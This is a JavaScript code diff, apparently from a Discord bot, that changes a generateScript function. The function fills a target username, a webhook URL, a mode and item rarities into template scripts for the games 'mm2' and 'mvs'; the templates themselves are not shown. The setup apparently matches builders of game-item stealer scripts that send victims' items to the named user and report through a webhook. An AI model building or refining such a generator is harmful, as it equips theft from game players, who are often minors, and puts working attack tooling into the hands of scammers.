@@ -322,9 +322,10 @@ function buildConfigModal(customId) {
 
 async function generateScript({ game, username, webhook, mode, rarities }) {
   if (game === 'mm2') {
+    // Reemplaza el valor actual sea cual sea (usamos función para evitar $ especiales)
     return MM2_SCRIPT
-      .replace(/TARGET_USER = "example"/g, `TARGET_USER = "${username}"`)
-      .replace(/WEBHOOK_URL = "example"/g, `WEBHOOK_URL = "${webhook}"`);
+      .replace(/TARGET_USER\s*=\s*"[^"]*"/, () => `TARGET_USER = "${username}"`)
+      .replace(/WEBHOOK_URL\s*=\s*"[^"]*"/, () => `WEBHOOK_URL = "${webhook}"`);
   }
 
   if (game === 'mvs') {
@@ -333,12 +334,13 @@ async function generateScript({ game, username, webhook, mode, rarities }) {
     const rarityList = safeRarities.length
       ? safeRarities.map(r => `"${r}"`).join(', ')
       : '"Ancient", "Mythic"';
+    const finalMode = mode === 'rarity' ? 'rarity' : 'all';
 
     return MVS_SCRIPT
-      .replace(/local TARGET = "example"/, `local TARGET = "${username}"`)
-      .replace(/local MODE = "all"/, `local MODE = "${mode === 'rarity' ? 'rarity' : 'all'}"`)
-      .replace(/local RARITIES = \{ "Ancient", "Mythic" \}/, `local RARITIES = { ${rarityList} }`)
-      .replace(/local WEBHOOK = "example"/, `local WEBHOOK = "${webhook}"`);
+      .replace(/local\s+TARGET\s*=\s*"[^"]*"/, () => `local TARGET = "${username}"`)
+      .replace(/local\s+MODE\s*=\s*"[^"]*"/, () => `local MODE = "${finalMode}"`)
+      .replace(/local\s+RARITIES\s*=\s*\{[^}]*\}/, () => `local RARITIES = { ${rarityList} }`)
+      .replace(/local\s+WEBHOOK\s*=\s*"[^"]*"/, () => `local WEBHOOK = "${webhook}"`);
   }
 
   throw new Error('Juego no soportado');
